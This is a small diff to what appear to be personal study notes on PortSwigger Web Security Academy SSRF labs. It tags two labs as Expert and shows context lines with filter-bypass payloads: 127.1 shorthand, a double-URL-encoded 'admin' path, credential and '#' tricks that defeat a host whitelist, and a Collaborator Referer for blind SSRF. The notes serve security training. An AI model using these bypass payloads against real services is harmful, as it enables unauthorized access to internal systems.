@@ -1265,7 +1265,7 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
    - Bypass blocking of http://127.0.0.1/, 'admin'
    - `http://127.1/` OK
    - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
-4. SSRF with **whitelist-based** input filter
+4. SSRF with **whitelist-based** input filter (Expert)
    - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
    - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
    - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
@@ -1279,7 +1279,7 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
    - Referer: https://0ac500a803221534816908d700410028.web-security-academy.net/
    - `Referer: http://pf84dopkq16zh0dq128f4xvqiho8c10q.oastify.com`
    - Copy collaborator and replace the referrer url > Goback Collaborator > click Poll now   > DNS records are showing
-7. Blind SSRF with **Shellshock** exploitation
+7. Blind SSRF with **Shellshock** exploitation (Expert)
    - Install Burp Extension '**Collaborator Everywhere**'
    - Add the target site to scope so that Collaborator Everywhere will target it
    - Navigate the site
